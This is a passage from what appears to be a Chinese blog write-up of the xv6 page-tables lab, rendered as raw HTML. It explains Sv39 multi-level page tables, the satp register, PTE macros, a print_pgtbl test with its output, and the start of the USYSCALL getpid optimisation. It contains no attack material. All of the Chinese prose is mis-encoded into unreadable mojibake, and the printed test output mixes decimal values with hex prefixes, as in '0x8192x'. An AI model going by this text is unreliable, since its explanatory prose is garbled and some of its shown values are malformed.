class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><mo>+</mo><mn>512</mn><mo>+</mo><mn>512</mn><mo>âˆ—</mo><mn>512</mn><mo>=</mo><msup><mn>2</mn><mn>18</mn></msup><mo>+</mo><msup><mn>2</mn><mn>9</mn></msup><mi>p</mi><mi>a</mi><mi>g</mi><mi>e</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">1+512+512*512=2^{18}+2^{9}pages</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">5</span><span class="mord">1</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span><span class="mord">1</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span><span class="mord">1</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">8</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">p</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span></span></span></span>ï¼Œä½†æ˜¯ä¸€çº§äºŒçº§é¡µè¡¨å­˜åœ¨ä¸€ä¸ª <code>Valid</code> ä½ï¼Œå¦‚æœæ²¡æœ‰ä½¿ç”¨è¿™ä¸ªæ¡ç›®ï¼Œä¹Ÿå°±æ˜¯æ— éœ€åˆ†é…å†…å­˜ç»™å®é™…çš„ä¸‹ä¸€çº§é¡µè¡¨ã€‚<br><img src="/2025/07/05/Lab-Page%20Tables/3lvpgtl.png" alt="3lvpgtl.png"></p><p>å¤šçº§é¡µè¡¨èŠ‚çº¦å†…å­˜çš„åŒæ—¶å¸¦æ¥é¢å¤–çš„å†…å­˜è®¿é—®å¼€é”€ã€‚ä¸ºäº†å¾—åˆ°ç‰©ç†é¡µå·ï¼ŒCPU éœ€è¦è®¿é—®ä¸‰æ¬¡å†…å­˜ï¼ŒåŒæ—¶è®¿é—®æ¯çº§é¡µè¡¨è¿˜å¯èƒ½å‘ç”Ÿç¼ºé¡µï¼Œè¿™æ›´å¤§ç¨‹åº¦ä¸Šå¢åŠ äº†ä¸ç¡®å®šçš„å¼€é”€ã€‚ä¸ºäº†é™ä½è¿™äº›å¼€é”€ï¼Œå¼•å…¥äº†ä¸€ä¸ªæ–°çš„ç¡¬ä»¶ TLB (Translation Look-aside Buffer) ï¼Œåˆ©ç”¨å±€éƒ¨æ€§ç¼“å†²éƒ¨åˆ† PTEs ã€‚</p><h2 id="xv6-å®ç°"><a class="markdownIt-Anchor" href="#xv6-å®ç°"></a> xv6 å®ç°</h2><p>å…·ä½“æ¥è¯´ï¼Œxv6 å¯¹äºè™šæ‹Ÿåœ°å€çš„å®ç°é€»è¾‘æœ‰ï¼š</p><ul><li><strong>å®šä¹‰é¡µè¡¨ç»“æ„</strong> (<code>kernel/riscv.h</code>)</li><li><strong>é¡µè¡¨åˆ†é…ä¸æ“ä½œ</strong> (<code>kernel/vm.c</code>)</li><li><strong>å†…æ ¸åœ°å€ç©ºé—´æ„å»º</strong> (<code>kernel/vm.cÂ -Â kvminit,Â kvminithart</code>)</li><li><strong>ç”¨æˆ·è¿›ç¨‹åœ°å€ç©ºé—´æ„å»º</strong>Â (<code>kernel/proc.c,Â kernel/exec.c,Â kernel/vm.c</code>)</li></ul><p>RISC-V CPU ä½¿ç”¨ <code>satp</code> å¯„å­˜å™¨å­˜æ”¾å½“å‰è¿›ç¨‹æ ¹é¡µè¡¨çš„ç‰©ç†åœ°å€ï¼Œæ ¹æ®è¿™ä¸ªæ ¹é¡µè¡¨æˆ‘ä»¬æ‰èƒ½è¿›è¡Œå¤šçº§çš„åœ°å€ç¿»è¯‘ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/riscv.h</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ ¹æ®æ ¹é¡µè¡¨çš„ç‰©ç†åœ°å€æ„é€  satp å€¼</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SATP_SV39 (8L &lt;&lt; 60)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAKE_SATP(pagetable) (SATP_SV39 | (((uint64)pagetable) &gt;&gt; 12))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// satp register çš„ load/store é€»è¾‘</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">w_satp</span><span class="params">(uint64 x)</span>&#123;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;csrw satp, %0&quot;</span> : : <span class="string">&quot;r&quot;</span> (x))</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> uint64 <span class="title function_">r_satp</span><span class="params">()</span>&#123;</span><br><span class="line">  uint64 x;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;csrr %0, satp&quot;</span> : <span class="string">&quot;=r&quot;</span> (x) )</span>;</span><br><span class="line">  <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¡µè¡¨ä¸ PTE ç»“æ„å®šä¹‰ï¼Œä»¥åŠç›¸å…³æ“ä½œæ–¹æ³•ï¼š</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mi>h</mi><mi>y</mi><mi>s</mi><mi>i</mi><mi>c</mi><mi>a</mi><mi>l</mi><mi mathvariant="normal">_</mi><mi>a</mi><mi>d</mi><mi>d</mi><mi>r</mi><mo>=</mo><mi>P</mi><mi>P</mi><mi>N</mi><mo stretchy="false">(</mo><mn>44</mn><mo stretchy="false">)</mo><mo>+</mo><mi>o</mi><mi>f</mi><mi>f</mi><mi>s</mi><mi>e</mi><mi>t</mi><mo stretchy="false">(</mo><mn>12</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">physical\_addr = PPN(44) + offset(12)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault">h</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">c</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mopen">(</span><span class="mord">4</span><span class="mord">4</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord">1</span><span class="mord">2</span><span class="mclose">)</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mi>T</mi><mi>E</mi><mo>=</mo><mi>P</mi><mi>P</mi><mi>N</mi><mo stretchy="false">(</mo><mn>44</mn><mo stretchy="false">)</mo><mo>+</mo><mi>f</mi><mi>l</mi><mi>a</mi><mi>g</mi><mi>s</mi><mo stretchy="false">(</mo><mn>10</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">PTE = PPN(44) + flags(10)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mopen">(</span><span class="mord">4</span><span class="mord">4</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">s</span><span class="mopen">(</span><span class="mord">1</span><span class="mord">0</span><span class="mclose">)</span></span></span></span></span></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/riscv.h</span></span><br><span class="line"><span class="keyword">typedef</span> uint64 <span class="type">pte_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> uint64 *<span class="type">pagetable_t</span>; <span class="comment">// 512 PTEs</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGSIZE 4096 <span class="comment">// bytes per page</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGSHIFT 12  <span class="comment">// bits of offset within a page</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// superpage</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUPERPGSIZE (2 * (1 &lt;&lt; 20)) <span class="comment">// bytes per page</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUPERPGROUNDUP(sz)  (((sz)+SUPERPGSIZE-1) &amp; ~(SUPERPGSIZE-1))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‘ä¸Šï¼ˆå‘ä¸‹ï¼‰èˆå…¥åˆ°é¡µè¾¹ç•Œ</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGROUNDUP(sz)  (((sz)+PGSIZE-1) &amp; ~(PGSIZE-1))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGROUNDDOWN(a) (((a)) &amp; ~(PGSIZE-1))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ç‰©ç†åœ°å€ä¸PTEç›¸äº’è½¬æ¢</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PA2PTE(pa) ((((uint64)pa) &gt;&gt; 12) &lt;&lt; 10)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE2PA(pte) (((pte) &gt;&gt; 10) &lt;&lt; 12)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_FLAGS(pte) ((pte) &amp; 0x3FF)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä»è™šæ‹Ÿåœ°å€ä¸­æå– 9-bit çš„é¡µè¡¨ç´¢å¼•</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PXMASK          0x1FF <span class="comment">// 9 bits</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PXSHIFT(level)  (PGSHIFT+(9*(level)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PX(level, va) ((((uint64) (va)) &gt;&gt; PXSHIFT(level)) &amp; PXMASK)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXVA (1L &lt;&lt; (9 + 9 + 9 + 12 - 1))</span></span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„ï¼šå†…æ ¸åªåœ¨è™šæ‹Ÿåœ°å€ä¸Šæ“ä½œï¼</strong><br>ä¸€æ—¦ xv6 å†…æ ¸å¯ç”¨äº†åˆ†é¡µï¼ˆåœ¨ Â <code>kvminithart()</code>Â  ä¸­å°†å†…æ ¸é¡µè¡¨åŠ è½½åˆ° Â SATPÂ  å¯„å­˜å™¨åï¼‰ï¼ŒCPU ä¸Šçš„æ‰€æœ‰å†…å­˜è®¿é—®ï¼ˆå–æŒ‡ä»¤ã€è¯»/å†™æ•°æ®ï¼‰éƒ½<strong>å¿…é¡»ç»è¿‡ MMU çš„åœ°å€ç¿»è¯‘</strong>ã€‚è¿™æ„å‘³ç€å†…æ ¸æœ¬èº«çš„ä»£ç ï¼ŒåŒ…æ‹¬ Â <code>kalloc</code>ã€<code>kfree</code>Â  ç­‰ï¼Œæ“ä½œçš„éƒ½æ˜¯<strong>è™šæ‹Ÿåœ°å€</strong>ã€‚ä¸ºäº†è®©å†…æ ¸èƒ½å¤Ÿæ–¹ä¾¿åœ°ç®¡ç†æ‰€æœ‰ç‰©ç†å†…å­˜ï¼Œxv6 åœ¨å…¶å†…æ ¸é¡µè¡¨ä¸­åˆ›å»ºäº†ä¸€ä¸ª<strong>ç‰©ç†å†…å­˜çš„ç›´æ¥æ˜ å°„åŒºåŸŸ</strong>ã€‚</p><p>ç”±äº Â <code>KERNBASE</code>Â  å’Œç‰©ç†å†…å­˜çš„èµ·å§‹åœ°å€ç›¸åŒï¼ˆ0x80000000ï¼‰ï¼Œå¯¹äºå†…æ ¸çš„ç›´æ¥æ˜ å°„åŒºåŸŸæ¥è¯´ï¼Œ<strong>ç‰©ç†åœ°å€å’Œå†…æ ¸è™šæ‹Ÿåœ°å€çš„æ•°å€¼æ˜¯å®Œå…¨ç›¸ç­‰çš„</strong>ã€‚<br><img src="/2025/07/05/Lab-Page%20Tables/klayout.png" alt="klayout.png"></p><hr><h1 id="inspect-a-user-process-page-table"><a class="markdownIt-Anchor" href="#inspect-a-user-process-page-table"></a> Inspect a user-process page table</h1><blockquote><p>For every page table entry in theÂ <code>print_pgtbl</code>Â output, explain what it logically contains and what its permission bits are. Figure 3.4 in the xv6 book might be helpful, although <strong>note that the figure might have a slightly different set of pages than process thatâ€™s being inspected here</strong>. Note that xv6 doesnâ€™t place the virtual pages consecutively in physical memory.</p></blockquote><p>ä»¥ä¸‹æ˜¯ xv6 ä¸­ç”¨æˆ·è¿›ç¨‹çš„åœ°å€ç©ºé—´å¸ƒå±€<img src="/2025/07/05/Lab-Page%20Tables/ulayout.png" alt="ulayout.png"><br>è¿è¡Œ <code>pgtbltest</code> æµ‹è¯•ç¨‹åºå¾—åˆ°ä»¥ä¸‹çš„è¾“å‡ºï¼š</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">print_pgtbl starting</span><br><span class="line">va 0x0x pte 0x570249307x pa 0x2280996864x perm 0x91x</span><br><span class="line">va 0x4096x pte 0x570264599x pa 0x2281058304x perm 0x23x</span><br><span class="line">va 0x8192x pte 0x570263559x pa 0x2281054208x perm 0x7x</span><br><span class="line">va 0x12288x pte 0x570276055x pa 0x2281103360x perm 0x215x</span><br><span class="line">va 0x16384x pte 0x0x pa 0x0x perm 0x0x</span><br><span class="line">va 0x20480x pte 0x0x pa 0x0x perm 0x0x</span><br><span class="line">...</span><br><span class="line">va 0x4294950912x pte 0x0x pa 0x0x perm 0x0x</span><br><span class="line">va 0x4294955008x pte 0x0x pa 0x0x perm 0x0x</span><br><span class="line">va 0x4294959104x pte 0x570232007x pa 0x2280927232x perm 0x199x</span><br><span class="line">va 0x4294963200x pte 0x536878155x pa 0x2147512320x perm 0x75x</span><br><span class="line">print_pgtbl: OK</span><br></pre></td></tr></table></figure><p><code>print_pgtbl()</code> çš„è¡Œä¸ºæ˜¯æ‰“å°å½“å‰è¿›ç¨‹ï¼ˆå³<code>pgtbltest</code>ï¼‰çš„å‰åä¸ªè™šæ‹Ÿé¡µå’Œååä¸ªè™šæ‹Ÿé¡µæ‰€å¯¹åº”çš„ç‰©ç†é¡µçš„ä¿¡æ¯ï¼š</p><ul><li><code>va</code> è¡¨ç¤ºå½“å‰è™šæ‹Ÿé¡µçš„èµ·å§‹åœ°å€ <code>i * PGSIZE</code></li><li><code>pte</code> æ˜¯æ ¹æ®è™šæ‹Ÿåœ°å€åœ¨æ ¹é¡µè¡¨ä¸­ä¸æ–­ index ä¸‹å»å¾—åˆ°çš„ç¬¬ä¸‰çº§é¡µè¡¨é¡¹ï¼ˆ44+10 bitsï¼‰</li><li><code>pa</code> æ˜¯æå–é¡µè¡¨é¡¹ä¸­ 44-bit çš„ PPN å¾—åˆ°çš„ç‰©ç†é¡µåœ°å€ ï¼ˆ44+12 bitsï¼Œ4KB å¯¹é½ï¼‰</li><li><code>perm</code> åˆ™æ˜¯æå–é¡µè¡¨é¡¹æœ€å 12-bit å¾—åˆ°çš„è¯¥é¡µè®¿é—®æƒé™</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// user/pgtbltest.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_pgtbl</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;print_pgtbl starting\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (uint64 i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    print_pte(i * PGSIZE);</span><br><span class="line">  &#125;</span><br><span class="line">  uint64 top = MAXVA/PGSIZE;</span><br><span class="line">  <span class="keyword">for</span> (uint64 i = top<span class="number">-10</span>; i &lt; top; i++) &#123;</span><br><span class="line">    print_pte(i * PGSIZE);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;print_pgtbl: OK\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_pte</span><span class="params">(uint64 va)</span>&#123;</span><br><span class="line">    <span class="type">pte_t</span> pte = (<span class="type">pte_t</span>) pgpte((<span class="type">void</span> *) va);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;va 0x%lx pte 0x%lx pa 0x%lx perm 0x%lx\n&quot;</span>,</span><br><span class="line">    va, pte, PTE2PA(pte), PTE_FLAGS(pte));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/sysproc.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sys_pgpte</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">  uint64 va;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line">  p = myproc();   <span class="comment">// pagetable æ˜¯è°ƒç”¨ pgpte() çš„è¿›ç¨‹çš„é¡µè¡¨</span></span><br><span class="line">  argaddr(<span class="number">0</span>, &amp;va);</span><br><span class="line">  <span class="type">pte_t</span> *pte = pgpte(p-&gt;pagetable, va);</span><br><span class="line">  <span class="keyword">if</span>(pte != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> (uint64) *pte;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/vm.c</span></span><br><span class="line"><span class="comment">// ç³»ç»Ÿè°ƒç”¨ sys_pgpte çš„ helper function</span></span><br><span class="line"><span class="type">pte_t</span>* <span class="title function_">pgpte</span><span class="params">(<span class="type">pagetable_t</span> pagetable, uint64 va)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> walk(pagetable, va, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚è¾“å‡º <code>va 0x8192x pte 0x570263559x pa 0x2281054208x perm 0x7x</code> è¡¨ç¤ºè™šæ‹Ÿåœ°å€ <code>0x8192x</code> ï¼ˆi=2ï¼Œç¬¬ä¸‰ä¸ªè™šæ‹Ÿé¡µçš„èµ·å§‹åœ°å€ï¼‰åœ¨ä¸‰çº§é¡µè¡¨ä¸­å¯¹åº”çš„é¡µè¡¨é¡¹ä¸º <code>pte</code> ï¼Œä»ä¸­å¯ä»¥çŸ¥é“å®ƒçš„è®¿é—®æƒé™æ˜¯ <code>0x0111</code>ï¼Œå³å…·æœ‰è®¿é—®æƒé™ï¼Œå¯è¯»å†™ä½†æ˜¯ä¸å¯ä»¥æ‰§è¡Œï¼ˆå³è¿™ä¸ªç‰©ç†é¡µä¸Šçš„å†…å®¹ä¸æ˜¯å¯æ‰§è¡Œä»£ç ï¼‰ã€‚</p><p>è€Œè¾“å‡º<code>va 0x16384x pte 0x0x pa 0x0x perm 0x0x</code> åˆ™è¡¨ç¤ºè¿™ä¸ªè™šæ‹Ÿé¡µå¹¶æ²¡æœ‰æ˜ å°„åˆ°å®é™…çš„ç‰©ç†é¡µä¸Šï¼Œå› æ­¤ä¹Ÿæ²¡æœ‰è®¿é—®æƒé™ <code>perm</code> ä¸º 0ã€‚</p><h1 id="speed-up-system-calls"><a class="markdownIt-Anchor" href="#speed-up-system-calls"></a> Speed up system calls</h1><p>è¿™ä¸ªä»»åŠ¡æ—¨åœ¨è®©æˆ‘ä»¬ä¼˜åŒ– <code>getpid()</code> è¿™ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆéœ€è¦ä¼˜åŒ–ï¼Ÿ</p><p>ç³»ç»Ÿè°ƒç”¨éœ€è¦ä¸¤æ¬¡ç”¨æˆ·æ€å’Œå†…æ ¸æ€æ¨¡å¼ä¹‹é—´çš„åˆ‡æ¢ï¼Œç¬¬ä¸€æ¬¡åˆ‡æ¢é€šè¿‡ <code>ecall</code> è°ƒç”¨ syscallï¼Œåœ¨ä¸€ç³»åˆ—å†…æ ¸å¤„ç†ä¹‹åé€šè¿‡ <code>sret</code> å†åº¦è¿”å›åˆ°ç”¨æˆ·æ€ã€‚å¯¹äº <code>getpid()</code> è¿™ä¸ªç³»ç»Ÿè°ƒç”¨æ¥è¯´ï¼Œç”¨æˆ·æ€çš„éœ€æ±‚åªæ˜¯è¯»å–ï¼ˆåªè¯»ï¼‰ä¸€ä¸ªå†…æ ¸ç©ºé—´é‡Œçš„ä¸€ä¸ªæ•°æ®ï¼Œä½†å´è¦æ‰§è¡Œä¿å­˜/æ¢å¤å¯„å­˜å™¨çš„çŠ¶æ€ã€æ ˆåˆ‡æ¢ï¼ˆæ ˆæŒ‡é’ˆæŒ‡å‘å†…æ ¸æ ˆï¼‰ç­‰æ“ä½œï¼Œç›¸æ¯”ä¹‹ä¸‹å¼€é”€å¾ˆå¤§ã€‚<strong>æ—¢ç„¶ PID è¿™ä¸ªä¿¡æ¯å¯¹ç”¨æˆ·ç¨‹åºæ¥è¯´æ˜¯åªè¯»çš„ï¼Œæˆ‘ä»¬ä¸å¦‚æå‰å°†å®ƒæ”¾åœ¨ä¸€ä¸ªç”¨æˆ·ç¨‹åºå¯ä»¥ç›´æ¥è¯»å–çš„å†…å­˜åŒºåŸŸï¼Œè¿™æ ·ç”¨æˆ·ç¨‹åºå°±ä¸å†éœ€è¦è¿›å…¥å†…æ ¸å»è·å– PID çš„å€¼äº†ã€‚</strong></p><blockquote><p>When each process is created, map one read-only page at USYSCALL (a virtual address defined inÂ <code>memlayout.h</code>). At the start of this page, store aÂ struct <code>usyscall</code>Â (also defined inÂ <code>memlayout.h</code>), and initialize it to store the PID of the current process. For this lab,Â <code>ugetpid()</code>Â has been provided on the userspace side and will automatically use the USYSCALL mapping.</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// user/ulib.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">ugetpid</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">usyscall</span> *<span class="title">u</span> =</span> (<span class="keyword">struct</span> usyscall *)USYSCALL;</span><br><span class="line">  <span class="keyword">return</span> u-&gt;pid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»ä¸Šé¢çš„ <code>ugetpid()</code> å¯ä»¥çŸ¥é“å®ƒç¼ºå¤±æ—¶åœ¨ <code>USYSCALL</code> çš„ä½ç½®è¯»å–ä¸€ä¸ª <code>usyscall</code> ç»“æ„ä½“å­˜å‚¨çš„ <code>pid</code>ã€‚</p><p>å®ç°çš„é€»è¾‘å¦‚ä¸‹ï¼š</p><ol><li>é€šè¿‡ <code>kalloc()</code> ç”³è¯·ä¸€ä¸ªç©ºçš„ç‰©ç†é¡µ</li><li>æ ¹æ® <code>walk</code> æ‰¾åˆ° <code>USYSCALL</code> è™šæ‹Ÿåœ°å€å¯¹åº”çš„é¡µè¡¨é¡¹ï¼Œæ­¤æ—¶è¿™ä¸ªé¡µè¡¨é¡¹ä¸ºç©º</li><li>å°†è™šæ‹Ÿåœ°å€å’Œç‰©ç†é¡µè¿›è¡Œæ˜ å°„ï¼Œå³åˆå§‹åŒ–é¡µè¡¨é¡¹</li><li>åœ¨é¡µçš„èµ·å§‹åœ°å€ï¼Œå³ <code>USYSCALL</code> ä¸Šå†™å…¥ <code>usyscall</code> ç»“æ„ä½“</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 